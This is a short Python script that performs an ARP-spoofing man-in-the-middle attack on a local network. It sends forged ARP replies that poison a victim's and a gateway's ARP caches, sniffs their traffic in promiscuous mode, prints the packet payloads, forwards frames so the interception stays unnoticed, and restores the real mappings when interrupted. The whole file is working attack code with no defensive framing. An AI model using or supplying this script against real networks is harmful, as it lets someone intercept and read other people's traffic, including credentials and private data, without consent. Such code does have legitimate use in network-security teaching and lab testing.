#!/usr/bin/env python3
"""Script for ARP spoofing"""

import time
from framebuilder import defs, eth, ipv4, tools

INTERVAL = 10**9
VICTIM_IP = '10.0.0.100'
VICTIM_MAC = tools.get_mac_for_dst_ip(VICTIM_IP)
GATEWAY_IP = '10.0.0.1'
GATEWAY_MAC = tools.get_mac_for_dst_ip(GATEWAY_IP)
OWN_IP = '10.0.0.200'
OWN_MAC = tools.get_mac_addr('eth0')

print(f'pretend {GATEWAY_IP} to be at {OWN_MAC}')

arp_data_victim = {'operation': 2,
        'src_addr': OWN_MAC,
        'dst_addr': VICTIM_MAC,
        'snd_hw_addr': OWN_MAC,
        'snd_ip_addr': GATEWAY_IP,
        'tgt_hw_addr': OWN_MAC,
        'tgt_ip_addr': GATEWAY_IP}

arp_msg_victim = eth.ArpMessage(arp_data_victim)

arp_data_gateway = {'operation': 2,
        'src_addr': OWN_MAC,
        'dst_addr': GATEWAY_MAC,
        'snd_hw_addr': OWN_MAC,
        'snd_ip_addr': VICTIM_IP,
        'tgt_hw_addr': OWN_MAC,
        'tgt_ip_addr': VICTIM_IP}

arp_msg_gateway = eth.ArpMessage(arp_data_gateway)

eth_handler = eth.EthernetHandler('eth0', local_mac=OWN_MAC, remote_mac=VICTIM_MAC, block=0)
# current time
ctime = 0

try:
    while True:
        if time.time_ns() >= ctime + INTERVAL or ctime == 0:
            arp_msg_gateway.send(eth_handler.socket)
            arp_msg_victim.send(eth_handler.socket)
            ctime = time.time_ns()
        frame, frame_type = eth_handler.receive(promisc=True)
        
        # frame_type 4 means from us
        if frame is not None and frame_type != 4:
            ip_pk = ipv4.IPv4Packet.from_frame(frame)
            conditions  = [ip_pk.src_addr == VICTIM_IP,
                    ip_pk.dst_addr == VICTIM_IP,
                    ip_pk.src_addr == GATEWAY_IP,
                    ip_pk.dst_addr == GATEWAY_IP]
            if any(conditions):
                print(f'Received paket: {ip_pk.src_addr} > {ip_pk.dst_addr}')
                tools.print_pkg_data_ascii(ip_pk.payload)
                if frame.src_addr == GATEWAY_MAC and ip_pk.dst_addr != OWN_IP:
                    print('Forwarding frame to victim')
                    eth_handler.remote_mac = VICTIM_MAC
                    eth_handler.send(ip_pk)
                if frame.src_addr == VICTIM_MAC and ip_pk.dst_addr != OWN_IP:
                    print('Forwarding frame to gateway')
                    eth_handler.remote_mac = GATEWAY_MAC
                    eth_handler.send(ip_pk)
except KeyboardInterrupt:
    print('hand over to real gateway...')
    arp_data_victim = {'operation': 2,
            'src_addr': OWN_MAC,
            'dst_addr': VICTIM_MAC,
            'snd_hw_addr': GATEWAY_MAC,
            'snd_ip_addr': GATEWAY_IP,
            'tgt_hw_addr': GATEWAY_MAC,
            'tgt_ip_addr': GATEWAY_IP}

    arp_msg_victim = eth.ArpMessage(arp_data_victim)

    arp_data_gateway = {'operation': 2,
            'src_addr': OWN_MAC,
            'dst_addr': GATEWAY_MAC,
            'snd_hw_addr': VICTIM_MAC,
            'snd_ip_addr': VICTIM_IP,
            'tgt_hw_addr': VICTIM_MAC,
            'tgt_ip_addr': VICTIM_IP}

    arp_msg_gateway = eth.ArpMessage(arp_data_gateway)
    for i in range(3): 
        arp_msg_gateway.send(eth_handler.socket)
        arp_msg_victim.send(eth_handler.socket)
        time.sleep(0.1)
    print('done')
